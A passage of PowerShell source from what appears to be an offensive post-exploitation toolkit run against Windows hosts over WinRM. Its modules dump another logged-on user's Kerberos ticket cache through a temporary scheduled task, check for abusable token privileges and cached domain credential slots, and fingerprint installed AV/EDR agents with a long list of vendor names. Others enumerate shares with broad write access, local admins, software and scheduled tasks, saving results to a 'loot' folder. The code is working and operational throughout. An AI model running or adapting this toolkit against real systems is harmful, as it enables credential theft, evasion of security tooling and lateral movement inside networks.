    $taskName = 'AutoRDPwnK' + (New-ARModuleToken -Length 6)
    try {
        $userName = [string](Invoke-ARRemote -Session $session -ArgumentList $Session -ScriptBlock {
            param($sessionId)
            $user = ''
            foreach ($line in @(& query.exe session 2>&1 | ForEach-Object { [string]$_ })) {
                $text = $line.Trim()
                if ($text -eq '') { continue }
                $tokens = @($text -split '\s+')
                for ($index = 1; $index -lt $tokens.Count; $index++) {
                    if ($tokens[$index] -ne $sessionId) { continue }
                    if ($index -ge 2) { $user = $tokens[$index - 1] }
                    break
                }
                if ($user -ne '') { break }
            }
            return $user
        })
        if ([string]::IsNullOrWhiteSpace($userName)) { throw ('No interactive user is attached to session ' + $Session + ' on the target.') }
        Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteFile, $taskName, $userName -ScriptBlock {
            param($directory, $report, $name, $user)
            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
            $arguments = '/c klist > "' + $report + '" 2>&1 & klist -k >> "' + $report + '" 2>&1'
            $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument $arguments
            $principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Limited
            Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
            Start-ScheduledTask -TaskName $name -ErrorAction Stop
        } | Out-Null
        $script:ARRemoteTasks.Add($taskName)
        $text = ''
        $deadline = [DateTime]::UtcNow.AddSeconds(30)
        while ([DateTime]::UtcNow -lt $deadline) {
            Start-Sleep -Milliseconds 500
            $text = [string](Invoke-ARRemote -Session $session -ArgumentList $remoteFile -ScriptBlock {
                param($path)
                if (-not (Test-Path -LiteralPath $path)) { return '' }
                try { return (Get-Content -LiteralPath $path -Raw -ErrorAction Stop) } catch { return '' }
            })
            if (-not [string]::IsNullOrWhiteSpace($text)) { break }
        }
        if ([string]::IsNullOrWhiteSpace($text)) { throw ('klist produced no output in session ' + $Session + ' within 30 seconds.') }
        [System.IO.File]::WriteAllText($localFile, $text, [System.Text.Encoding]::UTF8)
        Write-ARSuccess ('Kerberos ticket cache of session ' + $Session + ' (' + $userName + ') saved to ' + $localFile)
        Set-ARStatus 'Kerberos ticket cache dumped' 'Ok'
    }
    finally {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $taskName -ScriptBlock {
                param($name)
                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
        [void]$script:ARRemoteTasks.Remove($taskName)
        try {
            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackTokenPrivileges {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Token privilege enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $privileges = @()
        $privilegeExit = 0
        $groups = @()
        try {
            $privileges = @(& whoami.exe /priv 2>&1 | ForEach-Object { [string]$_ })
            $privilegeExit = $LASTEXITCODE
        }
        catch { $privilegeExit = -1 }
        try {
            $groups = @(& whoami.exe /groups 2>&1 | ForEach-Object { [string]$_ })
        }
        catch { }
        return [pscustomobject]@{ Privileges = $privileges; PrivilegeExit = $privilegeExit; Groups = $groups }
    }
    $wanted = @(
        'SeImpersonatePrivilege',
        'SeDebugPrivilege',
        'SeBackupPrivilege',
        'SeRestorePrivilege',
        'SeTakeOwnershipPrivilege'
    )
    Write-ARInfo ('Token privileges for ' + $target + ':')
    foreach ($name in $wanted) {
        $line = ''
        foreach ($candidate in @($result.Privileges)) {
            if ([string]$candidate -match ('^\s*' + [regex]::Escape($name) + '\b')) { $line = ([string]$candidate).Trim(); break }
        }
        if ($line -eq '') { Write-ARWarn ($name + ': not held') }
        else { Write-ARSuccess ($name + ': held -> ' + $line) }
    }
    Write-ARInfo ('whoami /priv exit code: ' + [string]$result.PrivilegeExit)
    Write-Host '--- whoami /priv ---' -ForegroundColor DarkGray
    foreach ($line in @($result.Privileges)) { Write-Host ([string]$line) -ForegroundColor Gray }
    Write-Host '--- whoami /groups ---' -ForegroundColor DarkGray
    foreach ($line in @($result.Groups)) { Write-Host ([string]$line) -ForegroundColor Gray }
    Set-ARStatus 'Token privileges enumerated' 'Ok'
}

function Invoke-ARAttackCachedLogons {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Cached logon inspection'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cachedCount = $null
        $countReadable = $false
        try {
            $cachedCount = [string](Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name 'CachedLogonsCount' -ErrorAction Stop).CachedLogonsCount
            $countReadable = $true
        }
        catch { }
        $cacheReadable = $false
        $entries = @()
        $reason = ''
        try {
            $key = Get-Item -LiteralPath 'HKLM:\SECURITY\Cache' -ErrorAction Stop
            $cacheReadable = $true
            $entries = @($key.GetValueNames() | Where-Object { $_ -match '^NL\$\d+$' } | Sort-Object)
        }
        catch { $reason = $_.Exception.Message }
        return [pscustomobject]@{
            CachedCount   = $cachedCount
            CountReadable = $countReadable
            CacheReadable = $cacheReadable
            Entries       = @($entries)
            Reason        = $reason
        }
    }
    if ([bool]$result.CountReadable) {
        Write-ARInfo ('CachedLogonsCount = ' + [string]$result.CachedCount)
        if ([string]$result.CachedCount -eq '0') { Write-ARInfo 'Domain cached credentials are disabled by policy on this target.' }
    }
    else { Write-ARWarn 'CachedLogonsCount could not be read from Winlogon.' }
    if ([bool]$result.CacheReadable) {
        $entries = @($result.Entries)
        Write-ARSuccess ('HKLM\SECURITY\Cache is readable and holds ' + [string]$entries.Count + ' cached credential slot(s).')
        if ($entries.Count -gt 0) { Write-ARInfo ('Slots: ' + ($entries -join ', ')) }
        else { Write-ARInfo 'The cache key is readable but currently has no NL$ slots.' }
    }
    else {
        Write-ARWarn ('HKLM\SECURITY\Cache is not readable from this context (it needs SYSTEM): ' + [string]$result.Reason)
    }
    Write-ARInfo 'Read-only: no value was written and nothing needs restoring.'
    Set-ARStatus 'Cached logon state inspected' 'Ok'
}

function Invoke-ARModuleHostAudit {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Host audit'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $facts = New-Object System.Collections.Generic.List[object]
        $truncated = New-Object System.Collections.Generic.List[string]
        try {
            $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop
            $facts.Add([pscustomobject]@{ Fact = 'OS'; Value = [string]$os.Caption })
            $facts.Add([pscustomobject]@{ Fact = 'Version'; Value = [string]$os.Version })
            $facts.Add([pscustomobject]@{ Fact = 'Build'; Value = [string]$os.BuildNumber })
            $facts.Add([pscustomobject]@{ Fact = 'Architecture'; Value = [string]$os.OSArchitecture })
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'OS'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        try {
            $hotfixes = @(Get-CimInstance -ClassName Win32_QuickFixEngineering -ErrorAction Stop | Select-Object -First ($cap + 1))
            $hotfixCount = $hotfixes.Count
            if ($hotfixCount -gt $cap) { $hotfixCount = $cap; $truncated.Add('hotfixes') }
            $facts.Add([pscustomobject]@{ Fact = 'Hotfixes'; Value = [string]$hotfixCount })
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'Hotfixes'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        try {
            $computer = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
            $facts.Add([pscustomobject]@{ Fact = 'Computer'; Value = [string]$computer.Name })
            if ([bool]$computer.PartOfDomain) { $facts.Add([pscustomobject]@{ Fact = 'Domain'; Value = [string]$computer.Domain }) }
            else { $facts.Add([pscustomobject]@{ Fact = 'Workgroup'; Value = [string]$computer.Domain }) }
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'Computer'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        try {
            $products = @(Get-CimInstance -Namespace 'root\SecurityCenter2' -ClassName AntiVirusProduct -ErrorAction Stop | Select-Object -First 16)
            if ($products.Count -eq 0) { $facts.Add([pscustomobject]@{ Fact = 'AV product'; Value = 'none registered' }) }
            else { $facts.Add([pscustomobject]@{ Fact = 'AV product'; Value = ((($products | ForEach-Object { [string]$_.displayName }) -join '; ')) }) }
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'AV product'; Value = 'SecurityCenter2 not available' }) }
        try {
            Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction Stop
            $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Machine', $env:COMPUTERNAME)
            $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context, [System.DirectoryServices.AccountManagement.IdentityType]::Sid, 'S-1-5-32-544')
            if ($null -eq $group) { throw 'the Administrators group was not found by SID' }
            $members = @($group.GetMembers() | Select-Object -First ($cap + 1))
            $adminCount = $members.Count
            if ($adminCount -gt $cap) { $adminCount = $cap; $truncated.Add('local administrators') }
            $facts.Add([pscustomobject]@{ Fact = 'Local admins'; Value = [string]$adminCount })
            $group.Dispose()
            $context.Dispose()
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'Local admins'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        try {
            $shares = @()
            try { $shares = @(Get-SmbShare -ErrorAction Stop | Select-Object -First ($cap + 1)) }
            catch { $shares = @(Get-CimInstance -ClassName Win32_Share -ErrorAction Stop | Select-Object -First ($cap + 1)) }
            $shareCount = $shares.Count
            if ($shareCount -gt $cap) { $shareCount = $cap; $truncated.Add('shares') }
            $facts.Add([pscustomobject]@{ Fact = 'Shares'; Value = [string]$shareCount })
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'Shares'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        try {
            $services = @(Get-CimInstance -ClassName Win32_Service -ErrorAction Stop | Select-Object -First ($cap + 1))
            $serviceCount = $services.Count
            if ($serviceCount -gt $cap) { $serviceCount = $cap; $truncated.Add('services') }
            $facts.Add([pscustomobject]@{ Fact = 'Services'; Value = [string]$serviceCount })
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'Services'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        try {
            $logons = @(Get-CimInstance -ClassName Win32_LogonSession -ErrorAction Stop |
                Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 } |
                Select-Object -First ($cap + 1))
            $logonCount = $logons.Count
            if ($logonCount -gt $cap) { $logonCount = $cap; $truncated.Add('logon sessions') }
            $facts.Add([pscustomobject]@{ Fact = 'Logon sessions'; Value = [string]$logonCount })
        }
        catch { $facts.Add([pscustomobject]@{ Fact = 'Logon sessions'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        $facts.Add([pscustomobject]@{ Fact = 'Collected'; Value = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') })
        return [pscustomobject]@{
            Facts     = @($facts.ToArray())
            Truncated = @($truncated.ToArray())
        }
    }
    $facts = @($result.Facts)
    if ($facts.Count -eq 0) {
        Write-ARWarn 'The host audit returned no facts.'
        Set-ARStatus 'Host audit: no facts returned' 'Warn'
        return
    }
    Show-ARText ($facts | Format-Table -AutoSize)
    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped at 2000 items: ' + [string]$item) }
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $localFile = Join-Path (Get-ARLootDirectory 'discovery') ('host-audit-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.json')
    $json = ConvertTo-Json -InputObject $facts -Depth 4
    [System.IO.File]::WriteAllText($localFile, $json, [System.Text.Encoding]::UTF8)
    Write-ARSuccess ('Host audit saved to ' + $localFile)
    Write-ARInfo 'Read-only: no value was written on the target.'
    Set-ARStatus 'Host audit complete' 'Ok'
}

function Invoke-ARModuleAvEnum {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'AV/EDR enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $rows = New-Object System.Collections.Generic.List[object]
        $notes = New-Object System.Collections.Generic.List[string]
        $truncated = New-Object System.Collections.Generic.List[string]
        $pattern = '(?i)(windows defender|windefend|msmpeng|msmpsvc|securityhealthservice|sense\b|symantec|mcafee|trellix|sophos|crowdstrike|csfalcon|sentinelone|sentinelagent|carbonblack|cbdefense|cylance|elastic.endpoint|tanium|qualys|rapid7|fireeye|cybereason|cortex xdr|kaspersky|eset service|bitdefender|avast|avg antivirus|trend micro|fortinet|fortiedr|huntress|vectra|darktrace|malwarebytes|webroot|norton|savservice|tmccsf|mcshield|vseamps|csagent|cbstream|repmsrv|mfehidk|mfetp|eamonm|ehdrv|bdselfpr|avp|klif|klhk|emsisoft|a2start|a2guard|avira|gdata|comodo|panda|vipre|fsecure|withsecure|drweb|escan|xcitium)'
        try {
            $products = @(Get-CimInstance -Namespace 'root\SecurityCenter2' -ClassName AntiVirusProduct -ErrorAction Stop | Select-Object -First 32)
            foreach ($product in $products) {
                $state = [uint32]0
                try { $state = [uint32]$product.productState } catch { }
                $realTime = ((($state -shr 8) -band 0x10) -ne 0)
                $rows.Add([pscustomobject]@{
                    Kind   = 'Product'
                    Name   = [string]$product.displayName
                    State  = ('0x' + $state.ToString('X6') + ' realtime=' + [string]$realTime)
                    Detail = [string]$product.pathToSignedProductExe
                })
            }
        }
        catch { $notes.Add('root\SecurityCenter2 is not available on this host: ' + $_.Exception.Message) }
        $services = @(Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue | Select-Object -First ($cap + 1))
        if ($services.Count -gt $cap) { $truncated.Add('services') }
        foreach ($service in @($services | Select-Object -First $cap)) {
            $haystack = [string]$service.Name + ' ' + [string]$service.DisplayName + ' ' + [string]$service.PathName
            if ($haystack -notmatch $pattern) { continue }
            $rows.Add([pscustomobject]@{
                Kind   = 'Service'
                Name   = [string]$service.Name
                State  = ([string]$service.State + ' start=' + [string]$service.StartMode + ' account=' + [string]$service.StartName)
                Detail = [string]$service.PathName
            })
        }
        $drivers = @(Get-CimInstance -ClassName Win32_SystemDriver -ErrorAction SilentlyContinue | Select-Object -First ($cap + 1))
        if ($drivers.Count -gt $cap) { $truncated.Add('kernel drivers') }
        foreach ($driver in @($drivers | Select-Object -First $cap)) {
            if ([string]$driver.State -ne 'Running') { continue }
            $haystack = [string]$driver.Name + ' ' + [string]$driver.DisplayName + ' ' + [string]$driver.PathName
            if ($haystack -notmatch $pattern) { continue }
            $rows.Add([pscustomobject]@{
                Kind   = 'Driver'
                Name   = [string]$driver.Name
                State  = [string]$driver.State
                Detail = [string]$driver.PathName
            })
        }
        return [pscustomobject]@{
            Rows      = @($rows.ToArray())
            Notes     = @($notes.ToArray())
            Truncated = @($truncated.ToArray())
        }
    }
    $rows = @($result.Rows)
    foreach ($note in @($result.Notes)) { Write-ARInfo ([string]$note) }
    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped at 2000 items: ' + [string]$item) }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'No AV/EDR product, service or running kernel driver matched the known names.'
        Set-ARStatus 'AV enumeration: nothing found' 'Ok'
        return
    }
    Show-ARText ($rows | Sort-Object Kind, Name | Format-Table Kind, Name, State, Detail -AutoSize -Wrap)
    Write-ARSuccess ('AV/EDR artifacts found: ' + [string]$rows.Count + '.')
    Write-ARInfo 'Matching is name based; a renamed agent can slip past it.'
    Write-ARInfo 'Read-only: no value was written on the target.'
    Set-ARStatus 'AV enumeration complete' 'Ok'
}

function Invoke-ARModuleShareEnum {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SMB share enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $rows = New-Object System.Collections.Generic.List[object]
        $source = 'Get-SmbShare'
        $shares = @()
        try { $shares = @(Get-SmbShare -ErrorAction Stop | Select-Object -First ($cap + 1)) }
        catch {
            $source = 'Win32_Share'
            try { $shares = @(Get-CimInstance -ClassName Win32_Share -ErrorAction Stop | Select-Object -First ($cap + 1)) }
            catch { return [pscustomobject]@{ Rows = @(); Source = $source; Truncated = $false; Error = $_.Exception.Message } }
        }
        $truncated = $false
        if ($shares.Count -gt $cap) { $shares = @($shares | Select-Object -First $cap); $truncated = $true }
        foreach ($share in $shares) {
            $name = [string]$share.Name
            $accesses = @()
            try { $accesses = @(Get-SmbShareAccess -Name $name -ErrorAction Stop | Select-Object -First 128) } catch { }
            $accessText = New-Object System.Collections.Generic.List[string]
            $broad = New-Object System.Collections.Generic.List[string]
            foreach ($access in $accesses) {
                $principal = [string]$access.AccountName
                $right = [string]$access.AccessRight
                $accessText.Add($principal + '=' + $right)
                if ($right -match '(?i)^(full|change)$' -and $principal -match '(?i)^(everyone|builtin\\users|nt authority\\authenticated users|anonymous logon|builtin\\guests)$') {
                    $broad.Add($principal + '=' + $right)
                }
            }
            $rows.Add([pscustomobject]@{
                Name            = $name
                Path            = [string]$share.Path
                Description     = [string]$share.Description
                Access          = ($accessText -join '; ')
                BroadWrite      = ($broad.Count -gt 0)
                BroadPrincipals = ($broad -join '; ')
            })
        }
        return [pscustomobject]@{
            Rows      = @($rows.ToArray())
            Source    = $source
            Truncated = $truncated
            Error     = ''
        }
    }
    if (-not [string]::IsNullOrWhiteSpace([string]$result.Error)) {
        Write-ARWarn ('Share enumeration failed: ' + [string]$result.Error)
        Set-ARStatus 'Share enumeration: failed' 'Warn'
        return
    }
    $rows = @($result.Rows)
    Write-ARInfo ('Share source: ' + [string]$result.Source)
    if ([bool]$result.Truncated) { Write-ARWarn 'Share list capped at 2000 items.' }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'No SMB share is exposed on the target.'
        Set-ARStatus 'Share enumeration: nothing found' 'Ok'
        return
    }
    foreach ($row in @($rows | Where-Object { $_.BroadWrite })) {
        Write-ARWarn ('Broad principal can write: ' + [string]$row.Name + ' -> ' + [string]$row.BroadPrincipals)
    }
    Show-ARText ($rows | Sort-Object Name | Format-Table Name, BroadWrite, BroadPrincipals, Path -AutoSize -Wrap)
    Show-ARText ($rows | Sort-Object Name | Format-Table Name, Access -AutoSize -Wrap)
    Write-ARSuccess ('Shares enumerated: ' + [string]$rows.Count + '.')
    Write-ARInfo 'Read-only: no share, ACL or value was changed on the target.'
    Set-ARStatus 'Share enumeration complete' 'Ok'
}

function Invoke-ARModuleLocalAdmins {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Local group membership'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $rows = New-Object System.Collections.Generic.List[object]
        $notes = New-Object System.Collections.Generic.List[string]
        try { Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction Stop }
        catch { return [pscustomobject]@{ Rows = @(); Notes = @('AccountManagement is not available: ' + $_.Exception.Message) } }
        $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Machine', $env:COMPUTERNAME)
        $specs = @(
            [pscustomobject]@{ Name = 'Administrators'; Sid = 'S-1-5-32-544' },
            [pscustomobject]@{ Name = 'Remote Desktop Users'; Sid = 'S-1-5-32-555' }
        )
        foreach ($spec in $specs) {
            $group = $null
            try {
                $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context, [System.DirectoryServices.AccountManagement.IdentityType]::Sid, $spec.Sid)
            }
            catch { $notes.Add([string]$spec.Name + ': ' + $_.Exception.Message); continue }
            if ($null -eq $group) { $notes.Add([string]$spec.Name + ': group not found by SID ' + [string]$spec.Sid); continue }
            $members = @()
            try { $members = @($group.GetMembers() | Select-Object -First ($cap + 1)) }
            catch { $notes.Add([string]$spec.Name + ': members could not be read: ' + $_.Exception.Message); $group.Dispose(); continue }
            if ($members.Count -gt $cap) {
                $members = @($members | Select-Object -First $cap)
                $notes.Add([string]$spec.Name + ': member list capped at 2000 items')
            }
            foreach ($member in $members) {
                $name = ''
                $sid = ''
                $kind = ''
                try { $name = [string]$member.Name } catch { }
                try { $sid = [string]$member.Sid.Value } catch { }
                try {
                    $kind = [string]$member.GetType().Name
                    if ($kind.EndsWith('Principal')) { $kind = $kind.Substring(0, $kind.Length - 9) }
                }
                catch { }
                if ([string]::IsNullOrWhiteSpace($name) -and -not [string]::IsNullOrWhiteSpace($sid)) {
                    try { $name = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value } catch { }
                }
                $rows.Add([pscustomobject]@{
                    Group = [string]$spec.Name
                    Name  = $name
                    Sid   = $sid
                    Kind  = $kind
                })
            }
            $group.Dispose()
        }
        $context.Dispose()
        return [pscustomobject]@{
            Rows  = @($rows.ToArray())
            Notes = @($notes.ToArray())
        }
    }
    $rows = @($result.Rows)
    foreach ($note in @($result.Notes)) { Write-ARInfo ([string]$note) }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'No member could be read from Administrators or Remote Desktop Users.'
        Set-ARStatus 'Local group membership: nothing found' 'Ok'
        return
    }
    Show-ARText ($rows | Sort-Object Group, Name | Format-Table Group, Name, Sid, Kind -AutoSize -Wrap)
    Write-ARSuccess ('Group members enumerated: ' + [string]$rows.Count + '.')
    Write-ARInfo 'Read-only: group membership was not changed on the target.'
    Set-ARStatus 'Local group membership complete' 'Ok'
}

function Invoke-ARModuleSoftwareEnum {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Installed software enumeration'
    $session = Get-ARTargetSession
    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $script:ARRemoteTempDirs.Add($remoteDirectory)
    $remoteCsv = Join-Path $remoteDirectory 'software.csv'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $localCsv = Join-Path (Get-ARLootDirectory 'discovery') ('software-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.csv')
    try {
        Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
            param($directory)
            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
        } | Out-Null
        $summary = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteCsv -ScriptBlock {
            param($directory, $archive)
            $cap = 2000
            $keys = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
            )
            $rows = New-Object System.Collections.Generic.List[object]
            $truncated = $false
            foreach ($key in $keys) {
                if (-not (Test-Path -LiteralPath $key)) { continue }
                try { $subKeys = @(Get-ChildItem -LiteralPath $key -ErrorAction Stop | Select-Object -First ($cap + 1)) }
                catch { continue }
                foreach ($subKey in $subKeys) {
                    if ($rows.Count -ge $cap) { $truncated = $true; break }
                    try { $item = Get-ItemProperty -LiteralPath $subKey.PSPath -ErrorAction Stop } catch { continue }
                    $name = [string]$item.DisplayName
                    if ([string]::IsNullOrWhiteSpace($name)) { continue }
                    $rows.Add([pscustomobject]@{
                        Name            = $name.Trim()
                        Version         = [string]$item.DisplayVersion
                        Publisher       = [string]$item.Publisher
                        InstallDate     = [string]$item.InstallDate
                        InstallLocation = [string]$item.InstallLocation
                        UninstallString = [string]$item.UninstallString
                        Key             = $key
                    })
                }
                if ($truncated) { break }
            }
            if ($rows.Count -eq 0) {
                return [pscustomobject]@{ Count = 0; Bytes = 0; Truncated = $false }
            }
            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
            $rows | Export-Csv -LiteralPath $archive -NoTypeInformation -Encoding UTF8 -ErrorAction Stop
            return [pscustomobject]@{
                Count     = $rows.Count
                Bytes     = [int64](Get-Item -LiteralPath $archive -ErrorAction Stop).Length
                Truncated = $truncated
            }
        }
        if ([int]$summary.Count -eq 0) {
            Write-ARWarn 'No installed software entry with a DisplayName was found in either Uninstall key.'
            Set-ARStatus 'Software enumeration: nothing found' 'Warn'
            return
        }
        Receive-ARFileFromTarget -RemotePath $remoteCsv -LocalPath $localCsv -Session $session | Out-Null
        if ([bool]$summary.Truncated) { Write-ARWarn 'Software list capped at 2000 entries.' }
        $preview = @(Import-Csv -LiteralPath $localCsv | Select-Object -First 25)
        Show-ARText ($preview | Format-Table Name, Version, Publisher -AutoSize -Wrap)
        Write-ARSuccess ('Installed software: ' + [string]$summary.Count + ' entries saved to ' + $localCsv)
        Write-ARInfo 'Read-only: the registry was read and the staging CSV is removed on exit.'
        Set-ARStatus 'Software enumeration complete' 'Ok'
    }
    finally {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
    }
}

function Invoke-ARModuleTaskEnum {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Scheduled task enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $rows = New-Object System.Collections.Generic.List[object]
        $notes = New-Object System.Collections.Generic.List[string]
        $truncated = $false
        $source = 'Get-ScheduledTask'
        $pattern = '(?i)\b(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32)(\.exe)?\b'
        $tasks = @()
        try { $tasks = @(Get-ScheduledTask -ErrorAction Stop | Select-Object -First ($cap + 1)) }
        catch {
            $source = 'task XML'
            $notes.Add('Get-ScheduledTask is not available: ' + $_.Exception.Message)
        }
        if ($source -eq 'Get-ScheduledTask') {
            if ($tasks.Count -gt $cap) { $tasks = @($tasks | Select-Object -First $cap); $truncated = $true }
            foreach ($task in $tasks) {
                $actions = @()
                try { $actions = @($task.Actions | Select-Object -First 20) } catch { continue }
                foreach ($action in $actions) {
                    $execute = [string]$action.Execute
                    $arguments = [string]$action.Arguments
                    if (($execute + ' ' + $arguments) -notmatch $pattern) { continue }
                    $userId = ''
                    try { $userId = [string]$task.Principal.UserId } catch { }
                    $rows.Add([pscustomobject]@{
                        Task      = ([string]$task.TaskPath + [string]$task.TaskName)
                        Execute   = $execute
                        Arguments = $arguments
                        User      = $userId
                        State     = [string]$task.State
                    })
                }
                if ($rows.Count -ge $cap) { $truncated = $true; break }
            }
        }
        else {
            $tasksRoot = Join-Path $env:SystemRoot 'System32\Tasks'
            $files = @()
            try { $files = @(Get-ChildItem -LiteralPath $tasksRoot -Recurse -File -ErrorAction Stop | Select-Object -First ($cap + 1)) }
            catch { $notes.Add('Task folder could not be read: ' + $_.Exception.Message) }
            if ($files.Count -gt $cap) { $files = @($files | Select-Object -First $cap); $truncated = $true }
            foreach ($file in $files) {
                if ($rows.Count -ge $cap) { $truncated = $true; break }
                $document = New-Object System.Xml.XmlDocument
                $document.XmlResolver = $null
                try { $document.Load($file.FullName) } catch { continue }
                $execNodes = @($document.SelectNodes('//*[local-name()="Exec"]') | Select-Object -First 20)
                $userNode = $document.SelectSingleNode('//*[local-name()="UserId"]')
                $userId = ''
                if ($null -ne $userNode) { $userId = [string]$userNode.InnerText }
                foreach ($execNode in $execNodes) {
                    $commandNode = $execNode.SelectSingleNode('*[local-name()="Command"]')
                    $argumentsNode = $execNode.SelectSingleNode('*[local-name()="Arguments"]')
                    $execute = ''
                    $arguments = ''
                    if ($null -ne $commandNode) { $execute = [string]$commandNode.InnerText }
                    if ($null -ne $argumentsNode) { $arguments = [string]$argumentsNode.InnerText }
                    if (($execute + ' ' + $arguments) -notmatch $pattern) { continue }
                    $taskName = $file.FullName
                    if ($taskName.StartsWith($tasksRoot)) { $taskName = $taskName.Substring($tasksRoot.Length).TrimStart('\') }
                    $rows.Add([pscustomobject]@{
                        Task      = $taskName
                        Execute   = $execute
                        Arguments = $arguments
                        User      = $userId
                        State     = 'unknown'
                    })
                }
            }
        }
        return [pscustomobject]@{
            Rows      = @($rows.ToArray())
            Source    = $source
            Notes     = @($notes.ToArray())
            Truncated = $truncated
        }
    }
    $rows = @($result.Rows)
    Write-ARInfo ('Task source: ' + [string]$result.Source)
    foreach ($note in @($result.Notes)) { Write-ARInfo ([string]$note) }
    if ([bool]$result.Truncated) { Write-ARWarn 'Task scan capped at 2000 tasks.' }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'No scheduled task action calls powershell, cmd, wscript, cscript, mshta, rundll32 or regsvr32.'
        Set-ARStatus 'Scheduled task enumeration: nothing found' 'Ok'
        return
    }
    $preview = @($rows | Sort-Object Task | Select-Object -First 200)
    Show-ARText ($preview | Format-Table Task, Execute, Arguments, User, State -AutoSize -Wrap)
    if ($rows.Count -gt $preview.Count) { Write-ARInfo ('Only the first 200 of ' + [string]$rows.Count + ' matching tasks are printed.') }
    Write-ARSuccess ('Matching scheduled tasks: ' + [string]$rows.Count + '.')
    Write-ARInfo 'Read-only: tasks were queried, never started or modified.'
    Set-ARStatus 'Scheduled task enumeration complete' 'Ok'
}

function Invoke-ARModuleServiceEnum {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Service enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $directoryCap = 300
